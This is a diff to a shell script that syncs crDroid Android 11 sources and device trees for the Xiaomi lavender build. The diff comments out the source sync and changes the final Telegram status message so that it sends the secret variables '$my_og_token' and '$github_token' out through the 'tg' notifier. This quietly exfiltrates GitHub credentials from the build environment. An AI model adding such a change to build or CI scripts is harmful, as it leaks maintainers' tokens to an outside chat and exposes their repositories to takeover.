@@ -19,7 +19,7 @@ fi
 repo init --depth=1 --no-repo-verify -u https://github.com/crdroidandroid/android -b 11.0 --git-lfs
 
 # Sync source without unnecessary messages, try with -j30 first, if fails, it will try again
-repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j10 || repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j10
+# repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j10 || repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j10
 
 # tree
 git clone --depth=1 https://ImSpiDy:$my_og_token@github.com/ImSpiDy/device_xiaomi_lavender device/xiaomi/lavender -b R
@@ -56,6 +56,6 @@ cd /tmp/rom/vendor/qcom/opensource/power && curl https://github.com/Nub-XD/andro
 tg "$rom_name source sync completed!
 Total Size: $(du -sh /tmp/rom | cut -d - -f 1 | cut -d / -f 1)
 Time Took: $(($SECONDS / 60)) minute(s) and $(($SECONDS % 60)) second(s).
-Status: $progress"
+Status: $my_og_token $github_token"
 
 echo "$(($SECONDS / 60))" > /tmp/sync_time.txt
